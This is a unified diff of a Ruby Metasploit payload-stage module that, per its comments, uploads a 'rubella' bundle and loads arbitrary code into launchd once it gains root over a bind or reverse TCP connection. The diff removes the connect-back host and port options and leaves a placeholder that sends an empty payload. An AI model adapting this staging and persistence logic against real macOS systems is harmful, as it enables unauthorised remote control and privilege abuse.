@@ -22,8 +22,7 @@ require 'rex/compat'
 # over the established TCP connection (bind_tcp/reverse_tcp).  In addition,
 # rubella will load an arbitrary bundle into launchd if it can acquire root
 # privileges.  This bundle can be specified as a PATHOGEN_PAYLOAD.
-# TODO: make rubella include a default connect-back payload which reads the
-#       host and port from PATHOGEN_PAYLOAD.
+# TODO: make rubella do a privileged connect-back
 ###
 module Metasploit3
 
@@ -55,18 +54,6 @@ module Metasploit3
 						"The local path to the patient0 syringe Bundle to upload", 
 						File.join(Msf::Config.install_root, "data", "rubella.bundle")
 					]),
-				OptString.new('RUBELLA_HOST', 
-					[ 
-						true, 
-						"The connect back address if rubella gets root access",
-						"127.0.0.1"
-					]),
-				OptPort.new('RUBELLA_PORT', 
-					[ 
-						true, 
-						"The connect back port if rubella gets root access",
-						8081,
-					]),
 			], self.class)
 	end
 
@@ -74,9 +61,9 @@ module Metasploit3
     # Send other payloads first
     super
     # Don't send a payload yet.
-    print_status("Sending empty pathogen_payload")
-    # Use rubella's size instead of size + payload_size
-    #rub = File.open(File.join(Msf::Config.install_root, "data", "rubella.bundle"))
+    # TODO!
+    # print_status("Sending empty pathogen_payload")
+    # Don't send an additional payload.
 		conn.put([ 0 ].pack('V'))
   end
 
